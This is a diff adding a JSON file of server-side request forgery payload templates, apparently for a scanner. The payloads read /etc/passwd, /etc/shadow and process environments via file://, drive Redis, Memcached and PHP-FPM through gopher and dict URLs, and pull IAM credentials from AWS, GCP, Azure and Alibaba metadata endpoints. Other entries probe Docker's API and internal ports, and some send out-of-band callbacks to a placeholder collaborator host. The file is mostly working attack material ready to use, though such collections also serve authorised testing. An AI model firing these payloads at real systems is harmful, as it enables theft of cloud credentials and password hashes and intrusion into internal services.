@@ -1,0 +1,686 @@
+[
+  {
+    "category": "PROTOCOL",
+    "moduleName": "file",
+    "scheme": "file://",
+    "title": "Local /etc/passwd disclosure",
+    "payloadTemplate": "file:///etc/passwd",
+    "expectedIndicators": ["root:x:0:0:", "daemon:", "/bin/bash", "/bin/sh"],
+    "requiresCollaborator": false
+  },
+  {
+    "category": "PROTOCOL",
+    "moduleName": "file",
+    "scheme": "file://",
+    "title": "Local /etc/hosts disclosure",
+    "payloadTemplate": "file:///etc/hosts",
+    "expectedIndicators": ["127.0.0.1", "localhost"],
+    "requiresCollaborator": false
+  },
+  {
+    "category": "PROTOCOL",
+    "moduleName": "file",
+    "scheme": "file://",
+    "title": "Process environment inspection",
+    "payloadTemplate": "file:///proc/self/environ",
+    "expectedIndicators": ["PATH=", "PWD=", "USER=", "HOME="],
+    "requiresCollaborator": false
+  },
+  {
+    "category": "PROTOCOL",
+    "moduleName": "file",
+    "scheme": "file://",
+    "title": "Process cmdline inspection",
+    "payloadTemplate": "file:///proc/self/cmdline",
+    "expectedIndicators": [],
+    "requiresCollaborator": false
+  },
+  {
+    "category": "PROTOCOL",
+    "moduleName": "file",
+    "scheme": "file://",
+    "title": "Windows win.ini extraction",
+    "payloadTemplate": "file:///c:/windows/win.ini",
+    "expectedIndicators": ["[fonts]", "[extensions]", "for 16-bit app support"],
+    "requiresCollaborator": false
+  },
+  {
+    "category": "PROTOCOL",
+    "moduleName": "file",
+    "scheme": "file://",
+    "title": "Localhost file scheme bypass",
+    "payloadTemplate": "file://localhost/etc/passwd",
+    "expectedIndicators": ["root:x:0:0:"],
+    "requiresCollaborator": false
+  },
+  {
+    "category": "PROTOCOL",
+    "moduleName": "dict",
+    "scheme": "dict://",
+    "title": "Memcached STAT command query",
+    "payloadTemplate": "dict://127.0.0.1:11211/stat",
+    "expectedIndicators": ["STAT pid", "STAT version", "STAT uptime"],
+    "requiresCollaborator": false
+  },
+  {
+    "category": "PROTOCOL",
+    "moduleName": "dict",
+    "scheme": "dict://",
+    "title": "Redis INFO command probe",
+    "payloadTemplate": "dict://127.0.0.1:6379/info",
+    "expectedIndicators": ["redis_version", "tcp_port", "uptime_in_seconds"],
+    "requiresCollaborator": false
+  },
+  {
+    "category": "PROTOCOL",
+    "moduleName": "dict",
+    "scheme": "dict://",
+    "title": "Local port service banner probe",
+    "payloadTemplate": "dict://127.0.0.1:21/quit",
+    "expectedIndicators": ["220"],
+    "requiresCollaborator": false
+  },
+  {
+    "category": "PROTOCOL",
+    "moduleName": "sftp",
+    "scheme": "sftp://",
+    "title": "SFTP out-of-band callback connection",
+    "payloadTemplate": "sftp://{COLLABORATOR_HOST}:22/probe",
+    "expectedIndicators": [],
+    "requiresCollaborator": true
+  },
+  {
+    "category": "PROTOCOL",
+    "moduleName": "sftp",
+    "scheme": "sftp://",
+    "title": "SFTP internal SSH port probe",
+    "payloadTemplate": "sftp://127.0.0.1:22/ssh_test",
+    "expectedIndicators": ["SSH-2.0"],
+    "requiresCollaborator": false
+  },
+  {
+    "category": "PROTOCOL",
+    "moduleName": "tftp",
+    "scheme": "tftp://",
+    "title": "TFTP UDP out-of-band probe",
+    "payloadTemplate": "tftp://{COLLABORATOR_HOST}:69/probe",
+    "expectedIndicators": [],
+    "requiresCollaborator": true
+  },
+  {
+    "category": "PROTOCOL",
+    "moduleName": "tftp",
+    "scheme": "tftp://",
+    "title": "TFTP internal service request",
+    "payloadTemplate": "tftp://127.0.0.1:69/pxelinux.0",
+    "expectedIndicators": [],
+    "requiresCollaborator": false
+  },
+  {
+    "category": "PROTOCOL",
+    "moduleName": "ldap",
+    "scheme": "ldap://",
+    "title": "LDAP out-of-band callback query",
+    "payloadTemplate": "ldap://{COLLABORATOR_HOST}:389/dc=ssrf,dc=probe",
+    "expectedIndicators": [],
+    "requiresCollaborator": true
+  },
+  {
+    "category": "PROTOCOL",
+    "moduleName": "ldap",
+    "scheme": "ldap://",
+    "title": "LDAP internal root DSE query",
+    "payloadTemplate": "ldap://127.0.0.1:389/o=ssrf",
+    "expectedIndicators": [],
+    "requiresCollaborator": false
+  },
+  {
+    "category": "PROTOCOL",
+    "moduleName": "smtp",
+    "scheme": "smtp://",
+    "title": "SMTP out-of-band interaction probe",
+    "payloadTemplate": "smtp://{COLLABORATOR_HOST}:25/",
+    "expectedIndicators": [],
+    "requiresCollaborator": true
+  },
+  {
+    "category": "PROTOCOL",
+    "moduleName": "smtp",
+    "scheme": "smtp://",
+    "title": "SMTP internal mailer probe",
+    "payloadTemplate": "smtp://127.0.0.1:25/helo%20localhost",
+    "expectedIndicators": ["250"],
+    "requiresCollaborator": false
+  },
+  {
+    "category": "PROTOCOL",
+    "moduleName": "gopher",
+    "scheme": "gopher://",
+    "title": "Gopher Redis INFO command execution",
+    "payloadTemplate": "gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0aINFO%0d%0a",
+    "expectedIndicators": ["redis_version:", "tcp_port:6379"],
+    "requiresCollaborator": false
+  },
+  {
+    "category": "PROTOCOL",
+    "moduleName": "gopher",
+    "scheme": "gopher://",
+    "title": "Gopher Memcached stats command",
+    "payloadTemplate": "gopher://127.0.0.1:11211/_stats%0d%0a",
+    "expectedIndicators": ["STAT pid", "STAT version"],
+    "requiresCollaborator": false
+  },
+  {
+    "category": "PROTOCOL",
+    "moduleName": "gopher",
+    "scheme": "gopher://",
+    "title": "Gopher HTTP GET out-of-band probe",
+    "payloadTemplate": "gopher://{COLLABORATOR_HOST}:80/_GET%20/gopher_ssrf%20HTTP/1.0%0d%0aHost:%20{COLLABORATOR_HOST}%0d%0a%0d%0a",
+    "expectedIndicators": [],
+    "requiresCollaborator": true
+  },
+  {
+    "category": "PROTOCOL",
+    "moduleName": "gopher",
+    "scheme": "gopher://",
+    "title": "Gopher FastCGI PHP-FPM handshake probe",
+    "payloadTemplate": "gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00",
+    "expectedIndicators": [],
+    "requiresCollaborator": false
+  },
+  {
+    "category": "PROTOCOL",
+    "moduleName": "http",
+    "scheme": "http://",
+    "title": "HTTP localhost port 80 probe",
+    "payloadTemplate": "http://127.0.0.1:80/",
+    "expectedIndicators": [],
+    "requiresCollaborator": false
+  },
+  {
+    "category": "PROTOCOL",
+    "moduleName": "http",
+    "scheme": "http://",
+    "title": "HTTP localhost port 8080 probe",
+    "payloadTemplate": "http://127.0.0.1:8080/",
+    "expectedIndicators": [],
+    "requiresCollaborator": false
+  },
+  {
+    "category": "PROTOCOL",
+    "moduleName": "http",
+    "scheme": "http://",
+    "title": "HTTP localhost domain name probe",
+    "payloadTemplate": "http://localhost/",
+    "expectedIndicators": [],
+    "requiresCollaborator": false
+  },
+  {
+    "category": "PROTOCOL",
+    "moduleName": "http",
+    "scheme": "http://",
+    "title": "HTTP Collaborator out-of-band interaction",
+    "payloadTemplate": "http://{COLLABORATOR_HOST}/",
+    "expectedIndicators": [],
+    "requiresCollaborator": true
+  },
+  {
+    "category": "PROTOCOL",
+    "moduleName": "https",
+    "scheme": "https://",
+    "title": "HTTPS localhost port 443 probe",
+    "payloadTemplate": "https://127.0.0.1:443/",
+    "expectedIndicators": [],
+    "requiresCollaborator": false
+  },
+  {
+    "category": "PROTOCOL",
+    "moduleName": "https",
+    "scheme": "https://",
+    "title": "HTTPS localhost port 8443 probe",
+    "payloadTemplate": "https://127.0.0.1:8443/",
+    "expectedIndicators": [],
+    "requiresCollaborator": false
+  },
+  {
+    "category": "PROTOCOL",
+    "moduleName": "https",
+    "scheme": "https://",
+    "title": "HTTPS localhost domain probe",
+    "payloadTemplate": "https://localhost/",
+    "expectedIndicators": [],
+    "requiresCollaborator": false
+  },
+  {
+    "category": "PROTOCOL",
+    "moduleName": "https",
+    "scheme": "https://",
+    "title": "HTTPS Collaborator out-of-band interaction",
+    "payloadTemplate": "https://{COLLABORATOR_HOST}/",
+    "expectedIndicators": [],
+    "requiresCollaborator": true
+  },
+  {
+    "category": "CLOUD",
+    "moduleName": "aws",
+    "scheme": "http://",
+    "title": "AWS Instance Data alias",
+    "payloadTemplate": "http://instance-data",
+    "expectedIndicators": ["latest", "meta-data"],
+    "requiresCollaborator": false
+  },
+  {
+    "category": "CLOUD",
+    "moduleName": "aws",
+    "scheme": "http://",
+    "title": "AWS Metadata Root IP",
+    "payloadTemplate": "http://169.254.169.254",
+    "expectedIndicators": ["latest"],
+    "requiresCollaborator": false
+  },
+  {
+    "category": "CLOUD",
+    "moduleName": "aws",
+    "scheme": "http://",
+    "title": "AWS EC2 User-Data",
+    "payloadTemplate": "http://169.254.169.254/latest/user-data",
+    "expectedIndicators": [],
+    "requiresCollaborator": false
+  },
+  {
+    "category": "CLOUD",
+    "moduleName": "aws",
+    "scheme": "http://",
+    "title": "AWS User-Data IAM Security Credentials Role",
+    "payloadTemplate": "http://169.254.169.254/latest/user-data/iam/security-credentials/[ROLE NAME]",
+    "expectedIndicators": ["AccessKeyId", "SecretAccessKey", "Token"],
+    "requiresCollaborator": false
+  },
+  {
+    "category": "CLOUD",
+    "moduleName": "aws",
+    "scheme": "http://",
+    "title": "AWS EC2 Metadata Root",
+    "payloadTemplate": "http://169.254.169.254/latest/meta-data/",
+    "expectedIndicators": ["ami-id", "iam", "instance-id", "local-ipv4"],
+    "requiresCollaborator": false
+  },
+  {
+    "category": "CLOUD",
+    "moduleName": "aws",
+    "scheme": "http://",
+    "title": "AWS Meta-Data IAM Security Credentials Role",
+    "payloadTemplate": "http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE NAME]",
+    "expectedIndicators": ["AccessKeyId", "SecretAccessKey", "Token"],
+    "requiresCollaborator": false
+  },
+  {
+    "category": "CLOUD",
+    "moduleName": "aws",
+    "scheme": "http://",
+    "title": "AWS IAM PhotonInstance Role Credentials",
+    "payloadTemplate": "http://169.254.169.254/latest/meta-data/iam/security-credentials/PhotonInstance",
+    "expectedIndicators": ["AccessKeyId", "SecretAccessKey", "Token"],
+    "requiresCollaborator": false
+  },
+  {
+    "category": "CLOUD",
+    "moduleName": "aws",
+    "scheme": "http://",
+    "title": "AWS AMI ID",
+    "payloadTemplate": "http://169.254.169.254/latest/meta-data/ami-id",
+    "expectedIndicators": ["ami-"],
+    "requiresCollaborator": false
+  },
+  {
+    "category": "CLOUD",
+    "moduleName": "aws",
+    "scheme": "http://",
+    "title": "AWS Reservation ID",
+    "payloadTemplate": "http://169.254.169.254/latest/meta-data/reservation-id",
+    "expectedIndicators": ["r-"],
+    "requiresCollaborator": false
+  },
+  {
+    "category": "CLOUD",
+    "moduleName": "aws",
+    "scheme": "http://",
+    "title": "AWS Hostname",
+    "payloadTemplate": "http://169.254.169.254/latest/meta-data/hostname",
+    "expectedIndicators": [".internal", ".compute.internal"],
+    "requiresCollaborator": false
+  },
+  {
+    "category": "CLOUD",
+    "moduleName": "aws",
+    "scheme": "http://",
+    "title": "AWS Public Keys directory",
+    "payloadTemplate": "http://169.254.169.254/latest/meta-data/public-keys/",
+    "expectedIndicators": ["0="],
+    "requiresCollaborator": false
+  },
+  {
+    "category": "CLOUD",
+    "moduleName": "aws",
+    "scheme": "http://",
+    "title": "AWS OpenSSH Public Key index 0",
+    "payloadTemplate": "http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key",
+    "expectedIndicators": ["ssh-rsa", "ecdsa-sha2", "ssh-ed25519"],
+    "requiresCollaborator": false
+  },
+  {
+    "category": "CLOUD",
+    "moduleName": "aws",
+    "scheme": "http://",
+    "title": "AWS OpenSSH Public Key by ID",
+    "payloadTemplate": "http://169.254.169.254/latest/meta-data/public-keys/[ID]/openssh-key",
+    "expectedIndicators": ["ssh-rsa", "ssh-ed25519"],
+    "requiresCollaborator": false
+  },
+  {
+    "category": "CLOUD",
+    "moduleName": "aws",
+    "scheme": "http://",
+    "title": "AWS IAM Dummy Security Credentials",
+    "payloadTemplate": "http://169.254.169.254/latest/meta-data/iam/security-credentials/dummy",
+    "expectedIndicators": ["AccessKeyId", "SecretAccessKey"],
+    "requiresCollaborator": false
+  },
+  {
+    "category": "CLOUD",
+    "moduleName": "aws",
+    "scheme": "http://",
+    "title": "AWS IAM S3Access Security Credentials",
+    "payloadTemplate": "http://169.254.169.254/latest/meta-data/iam/security-credentials/s3access",
+    "expectedIndicators": ["AccessKeyId", "SecretAccessKey", "Token"],
+    "requiresCollaborator": false
+  },
+  {
+    "category": "CLOUD",
+    "moduleName": "aws",
+    "scheme": "http://",
+    "title": "AWS Instance Identity Document",
+    "payloadTemplate": "http://169.254.169.254/latest/dynamic/instance-identity/document",
+    "expectedIndicators": ["instanceId", "billingProducts", "imageId", "instanceType", "region"],
+    "requiresCollaborator": false
+  },
+  {
+    "category": "CLOUD",
+    "moduleName": "gcp",
+    "scheme": "http://",
+    "title": "Google Cloud ComputeMetadata IP Root",
+    "payloadTemplate": "http://169.254.169.254/computeMetadata/v1/",
+    "expectedIndicators": ["instance", "project"],
+    "requiresCollaborator": false
+  },
+  {
+    "category": "CLOUD",
+    "moduleName": "gcp",
+    "scheme": "http://",
+    "title": "Google Cloud Internal Metadata Domain Root",
+    "payloadTemplate": "http://metadata.google.internal/computeMetadata/v1/",
+    "expectedIndicators": ["instance", "project"],
+    "requiresCollaborator": false
+  },
+  {
+    "category": "CLOUD",
+    "moduleName": "gcp",
+    "scheme": "http://",
+    "title": "Google Cloud Short Metadata Domain Root",
+    "payloadTemplate": "http://metadata/computeMetadata/v1/",
+    "expectedIndicators": ["instance", "project"],
+    "requiresCollaborator": false
+  },
+  {
+    "category": "CLOUD",
+    "moduleName": "gcp",
+    "scheme": "http://",
+    "title": "Google Cloud Instance Hostname",
+    "payloadTemplate": "http://metadata.google.internal/computeMetadata/v1/instance/hostname",
+    "expectedIndicators": [".c.", ".internal"],
+    "requiresCollaborator": false
+  },
+  {
+    "category": "CLOUD",
+    "moduleName": "gcp",
+    "scheme": "http://",
+    "title": "Google Cloud Instance ID",
+    "payloadTemplate": "http://metadata.google.internal/computeMetadata/v1/instance/id",
+    "expectedIndicators": [],
+    "requiresCollaborator": false
+  },
+  {
+    "category": "CLOUD",
+    "moduleName": "gcp",
+    "scheme": "http://",
+    "title": "Google Cloud Project ID",
+    "payloadTemplate": "http://metadata.google.internal/computeMetadata/v1/project/project-id",
+    "expectedIndicators": [],
+    "requiresCollaborator": false
+  },
+  {
+    "category": "CLOUD",
+    "moduleName": "azure",
+    "scheme": "http://",
+    "title": "Azure Metadata Maintenance",
+    "payloadTemplate": "http://169.254.169.254/metadata/v1/maintenance",
+    "expectedIndicators": [],
+    "requiresCollaborator": false
+  },
+  {
+    "category": "CLOUD",
+    "moduleName": "azure",
+    "scheme": "http://",
+    "title": "Azure Instance Metadata (2017-04-02)",
+    "payloadTemplate": "http://169.254.169.254/metadata/instance?api-version=2017-04-02",
+    "expectedIndicators": ["compute", "vmId", "subscriptionId"],
+    "requiresCollaborator": false
+  },
+  {
+    "category": "CLOUD",
+    "moduleName": "azure",
+    "scheme": "http://",
+    "title": "Azure Network Interface 0 Public IP (2017-04-02)",
+    "payloadTemplate": "http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2017-04-02&format=text",
+    "expectedIndicators": [],
+    "requiresCollaborator": false
+  },
+  {
+    "category": "CLOUD",
+    "moduleName": "alibaba",
+    "scheme": "http://",
+    "title": "Alibaba Cloud ECS Metadata",
+    "payloadTemplate": "http://100.100.100.200/latest/meta-data/",
+    "expectedIndicators": ["instance-id", "image-id", "ram/security-credentials/"],
+    "requiresCollaborator": false
+  },
+  {
+    "category": "CLOUD",
+    "moduleName": "digitalocean",
+    "scheme": "http://",
+    "title": "DigitalOcean Droplet Metadata JSON",
+    "payloadTemplate": "http://169.254.169.254/metadata/v1.json",
+    "expectedIndicators": ["droplet_id", "hostname", "vendor_data"],
+    "requiresCollaborator": false
+  },
+  {
+    "category": "SERVICE",
+    "moduleName": "redis",
+    "scheme": "gopher://",
+    "title": "Redis Server INFO Extraction via Gopher",
+    "payloadTemplate": "gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0aINFO%0d%0aquit%0d%0a",
+    "expectedIndicators": ["redis_version", "tcp_port", "uptime_in_seconds"],
+    "requiresCollaborator": false
+  },
+  {
+    "category": "SERVICE",
+    "moduleName": "redis",
+    "scheme": "dict://",
+    "title": "Redis INFO via DICT Protocol",
+    "payloadTemplate": "dict://127.0.0.1:6379/info",
+    "expectedIndicators": ["redis_version", "os:Linux", "run_id"],
+    "requiresCollaborator": false
+  },
+  {
+    "category": "SERVICE",
+    "moduleName": "docker",
+    "scheme": "http://",
+    "title": "Docker Remote API Containers List",
+    "payloadTemplate": "http://127.0.0.1:2375/v1.40/containers/json",
+    "expectedIndicators": ["Id", "Image", "Command", "State"],
+    "requiresCollaborator": false
+  },
+  {
+    "category": "SERVICE",
+    "moduleName": "docker",
+    "scheme": "http://",
+    "title": "Docker Daemon Version Info",
+    "payloadTemplate": "http://127.0.0.1:2375/version",
+    "expectedIndicators": ["ApiVersion", "MinAPIVersion", "GitCommit"],
+    "requiresCollaborator": false
+  },
+  {
+    "category": "SERVICE",
+    "moduleName": "fastcgi",
+    "scheme": "gopher://",
+    "title": "FastCGI PHP-FPM TCP Tunnel Handshake",
+    "payloadTemplate": "gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%00%00%00%00",
+    "expectedIndicators": [],
+    "requiresCollaborator": false
+  },
+  {
+    "category": "SERVICE",
+    "moduleName": "readfiles",
+    "scheme": "file://",
+    "title": "Target Linux /etc/shadow read",
+    "payloadTemplate": "file:///etc/shadow",
+    "expectedIndicators": ["root:", "bin:"],
+    "requiresCollaborator": false
+  },
+  {
+    "category": "SERVICE",
+    "moduleName": "readfiles",
+    "scheme": "file://",
+    "title": "Target Linux /etc/issue read",
+    "payloadTemplate": "file:///etc/issue",
+    "expectedIndicators": ["Linux", "Ubuntu", "Debian", "CentOS"],
+    "requiresCollaborator": false
+  },
+  {
+    "category": "SERVICE",
+    "moduleName": "readfiles",
+    "scheme": "file://",
+    "title": "Target Linux /proc/version read",
+    "payloadTemplate": "file:///proc/version",
+    "expectedIndicators": ["Linux version", "gcc"],
+    "requiresCollaborator": false
+  },
+  {
+    "category": "SERVICE",
+    "moduleName": "memcached",
+    "scheme": "dict://",
+    "title": "Memcached Status Stats Query",
+    "payloadTemplate": "dict://127.0.0.1:11211/stat",
+    "expectedIndicators": ["STAT pid", "STAT version", "STAT curr_items"],
+    "requiresCollaborator": false
+  },
+  {
+    "category": "SERVICE",
+    "moduleName": "portscan",
+    "scheme": "http://",
+    "title": "Internal TCP Port 21 Probe",
+    "payloadTemplate": "http://127.0.0.1:21/",
+    "expectedIndicators": [],
+    "requiresCollaborator": false
+  },
+  {
+    "category": "SERVICE",
+    "moduleName": "portscan",
+    "scheme": "http://",
+    "title": "Internal TCP Port 22 Probe",
+    "payloadTemplate": "http://127.0.0.1:22/",
+    "expectedIndicators": [],
+    "requiresCollaborator": false
+  },
+  {
+    "category": "SERVICE",
+    "moduleName": "portscan",
+    "scheme": "http://",
+    "title": "Internal TCP Port 25 Probe",
+    "payloadTemplate": "http://127.0.0.1:25/",
+    "expectedIndicators": [],
+    "requiresCollaborator": false
+  },
+  {
+    "category": "SERVICE",
+    "moduleName": "portscan",
+    "scheme": "http://",
+    "title": "Internal TCP Port 80 Probe",
+    "payloadTemplate": "http://127.0.0.1:80/",
+    "expectedIndicators": [],
+    "requiresCollaborator": false
+  },
+  {
+    "category": "SERVICE",
+    "moduleName": "portscan",
+    "scheme": "http://",
+    "title": "Internal TCP Port 443 Probe",
+    "payloadTemplate": "http://127.0.0.1:443/",
+    "expectedIndicators": [],
+    "requiresCollaborator": false
+  },
+  {
+    "category": "SERVICE",
+    "moduleName": "portscan",
+    "scheme": "http://",
+    "title": "Internal TCP Port 3306 Probe",
+    "payloadTemplate": "http://127.0.0.1:3306/",
+    "expectedIndicators": [],
+    "requiresCollaborator": false
+  },
+  {
+    "category": "SERVICE",
+    "moduleName": "portscan",
+    "scheme": "http://",
+    "title": "Internal TCP Port 5432 Probe",
+    "payloadTemplate": "http://127.0.0.1:5432/",
+    "expectedIndicators": [],
+    "requiresCollaborator": false
+  },
+  {
+    "category": "SERVICE",
+    "moduleName": "portscan",
+    "scheme": "http://",
+    "title": "Internal TCP Port 6379 Probe",
+    "payloadTemplate": "http://127.0.0.1:6379/",
+    "expectedIndicators": [],
+    "requiresCollaborator": false
+  },
+  {
+    "category": "SERVICE",
+    "moduleName": "portscan",
+    "scheme": "http://",
+    "title": "Internal TCP Port 8080 Probe",
+    "payloadTemplate": "http://127.0.0.1:8080/",
+    "expectedIndicators": [],
+    "requiresCollaborator": false
+  },
+  {
+    "category": "SERVICE",
+    "moduleName": "portscan",
+    "scheme": "http://",
+    "title": "Internal TCP Port 9200 Probe",
+    "payloadTemplate": "http://127.0.0.1:9200/",
+    "expectedIndicators": [],
+    "requiresCollaborator": false
+  },
+  {
+    "category": "SERVICE",
+    "moduleName": "portscan",
+    "scheme": "http://",
+    "title": "Internal TCP Port 11211 Probe",
+    "payloadTemplate": "http://127.0.0.1:11211/",
+    "expectedIndicators": [],
+    "requiresCollaborator": false
+  }
+]
